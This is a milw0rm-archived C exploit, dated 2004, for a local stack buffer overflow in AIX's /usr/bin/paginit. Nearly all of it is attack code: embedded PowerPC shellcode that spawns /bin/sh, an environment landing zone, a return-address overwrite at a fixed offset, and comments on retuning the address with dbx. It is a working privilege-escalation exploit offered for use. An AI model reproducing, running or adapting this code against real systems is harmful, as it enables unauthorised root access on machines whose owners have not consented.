<html><head><title>AIX 5.1 to 5.3 paginit Local Stack Overflow Exploit</title></head><pre>/* exploit for /usr/bin/paginit
   tested on: AIX 5.2

   if the exploit fails it's because the shellcode
   ends up at a different address. use dbx to check,
   and change RETADDR accordingly.

   cees-bart &lt;ceesb cs ru nl&gt;
*/

#define RETADDR 0x2ff22c90

char shellcode[] =
&quot;\x7c\xa5\x2a\x79&quot;
&quot;\x40\x82\xff\xfd&quot;      
&quot;\x7c\xa8\x02\xa6&quot;      
&quot;\x38\xe0\x11\x11&quot;
&quot;\x39\x20\x48\x11&quot;      
&quot;\x7c\xc7\x48\x10&quot;      
&quot;\x38\x46\xc9\x05&quot;      
&quot;\x39\x25\x11\x11&quot;
&quot;\x38\x69\xef\x17&quot;      
&quot;\x38\x87\xee\xef&quot;      
&quot;\x7c\xc9\x03\xa6&quot;      
&quot;\x4e\x80\x04\x20&quot;
&quot;\x2f\x62\x69\x6e&quot;      
&quot;\x2f\x73\x68\x00&quot;
;

char envlabel[] = &quot;X=&quot;;

void printint(char* buf, int x) {
  buf[0] = x &gt;&gt; 24;
  buf[1] = (x &gt;&gt; 16) &amp; 0xff;
  buf[2] = (x &gt;&gt; 8) &amp; 0xff;
  buf[3] = x &amp; 0xff;
}

int main(int argc, char **argv) {
  char *env[3];
  char code[1000];
  char buf[8000];
  char *p, *i;
  int offset1 = 0;

  offset1 = 0; // atoi(argv[1]);
  
  memset(code, 'C', sizeof(code));
  memcpy(code, envlabel,sizeof(envlabel)-1);
  // landingzone 
  for(i=code+sizeof(envlabel)+offset1; i&lt;code+sizeof(code); i+=4) 
    printint(i, 0x7ca52a79);

  memcpy(code+sizeof(code)-sizeof(shellcode), shellcode, sizeof(shellcode)-1);  
  code[sizeof(code)-1] = 0;
  
  env[0] = code;
  env[1] = 0;

  memset(buf, 'A', sizeof(buf));
  buf[sizeof(buf)-1] = 0; 
  
  p = buf;
  p += 4114;
  printint(p,RETADDR); // try to hit the landingzone
  p += 72;
  printint(p, RETADDR); // any readable address (apparently not overwritten)

  execle(&quot;/usr/bin/paginit&quot;, &quot;/usr/bin/paginit&quot;, buf, 0, env);
}

// milw0rm.com [2004-12-20]</pre></html>